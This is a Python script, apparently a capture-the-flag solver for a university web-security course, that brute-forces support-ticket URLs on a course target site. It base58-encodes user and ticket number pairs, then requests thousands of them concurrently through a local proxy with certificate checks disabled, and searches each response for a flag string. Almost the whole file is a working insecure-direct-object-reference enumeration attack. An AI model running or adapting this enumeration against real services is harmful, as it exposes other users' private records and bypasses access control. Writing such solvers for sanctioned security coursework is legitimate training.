import requests
import re
import base58
import asyncio
import time
import aiohttp

timeout = aiohttp.ClientTimeout(total=999999999)
requests.packages.urllib3.disable_warnings() 
proxies = {
  'https': 'http://127.0.0.1:8080',
}
res = []

proxy = 'http://127.0.0.1:8080'

async def scrape_user(user):
    if user%10==0:
         print("user",user)
    for ticket in range(1,5000):
            data = str(base58.b58encode(f"{user}:{ticket}"))[2:-1]
            #print(user, ticket,"https://support.quoccacorp.com/raw/" + data)
            r = requests.get("https://support.quoccacorp.com/raw/" + data, proxies=proxies, verify=False)
            #print(r.status_code)
            if r.status_code == 404 or r.status_code == 500:
                #print(r.status_code)
                break     
            flag = re.search(r"COMP6443\{.*?\}",r.text)
            
            if flag:
                print(flag.group(0))
                return flag.group(0)
                res.append(flag.group(0))

async def fetch(session, data):
       
        async with session.get("https://support.quoccacorp.com/raw/" + data, proxy = proxy) as response:
            if response.status == 404:
                  return False
            if response.status == 429:
                 time.sleep(0.1)
                 return await fetch(session, data)
            return await response.text()


async def fetch_and_parse_urls(session ,user):
    ticket = 1
    while ticket:
        
        data = str(base58.b58encode(f"{user}:{ticket}"))[2:-1]
        #print(user,ticket,data)
        html = await fetch(session,data)
        if html == False:
             break
        print("user = ", user,"ticket =", ticket,"data =",data,end="\r")
        ticket += 1
        flag = re.search(r"COMP6443\{.*?\}",html)
        if flag:
            print(flag.group(0), user,ticket,data)
            return flag.group(0)

chunk = 100
async def scrape_urls(start_user):
    async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False), timeout=timeout) as session:
        return await asyncio.gather(*(fetch_and_parse_urls(session,user) for user in range(start_user,start_user+chunk)))
    await session.close()

def start_scrape_urls():
    results = []
    i = 9000
    while True:
        results.append(asyncio.run(scrape_urls(i)))
        i += chunk
    results = [x for x in results if not None]
    print(results)




start_scrape_urls()

##"VVjCtrEK" - (61*3 + 17)

#1000 - (61*3 + 17)


